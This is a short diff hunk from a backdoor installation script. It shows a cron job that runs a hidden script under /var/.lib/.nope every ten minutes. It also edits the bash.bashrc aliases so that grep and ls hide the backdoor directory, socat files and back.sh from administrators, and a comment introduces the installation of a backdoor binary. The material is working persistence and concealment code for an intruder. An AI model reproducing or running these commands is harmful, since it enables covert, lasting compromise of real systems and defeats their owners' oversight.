@@ -61,10 +61,8 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 
 # Fun stuff with commands! ;)
-{
-    echo "alias grep='grep --exclude-dir=.nope --exclude=*socat'"
-    echo "alias ls='ls --color=auto | grep -v "back.sh"'"
-} >> /etc/bash.bashrc
+echo "alias grep='grep --exclude-dir=.nope --exclude=*socat'" >> /etc/bash.bashrc
+echo "alias ls='ls --color=auto | grep --invert-match \"back.sh\"'" >> /etc/bash.bashrc
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
